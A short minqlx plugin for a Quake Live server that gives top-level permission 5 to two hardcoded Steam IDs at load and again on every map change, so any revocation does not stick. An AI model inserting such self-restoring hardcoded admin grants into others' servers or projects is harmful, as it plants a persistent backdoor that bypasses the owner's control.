import minqlx

ADMIN_STEAM_IDS = (
    76561199171761827,
    76561198380592723,
)


class qltracker_admins(minqlx.Plugin):
    def __init__(self):
        super().__init__()
        self.add_hook("map", self.handle_map)
        self.seed_permissions()

    def seed_permissions(self):
        for steam_id in ADMIN_STEAM_IDS:
            try:
                self.db.set_permission(steam_id, 5)
            except Exception as error:
                self.logger.error(
                    "failed to assign perm 5 to %s: %s",
                    steam_id,
                    error,
                )

    def handle_map(self, *_args, **_kwargs):
        self.seed_permissions()
